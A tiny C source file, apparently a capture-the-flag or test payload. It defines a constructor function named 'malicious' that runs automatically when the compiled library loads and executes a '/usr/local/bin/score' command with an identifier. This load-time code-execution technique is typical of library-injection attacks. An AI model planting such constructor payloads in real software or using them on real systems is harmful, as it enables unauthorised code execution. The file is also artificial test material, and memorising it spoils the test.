#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 4bd6d64a-17ed-4d3e-a415-cd1e857f6fe9");
}
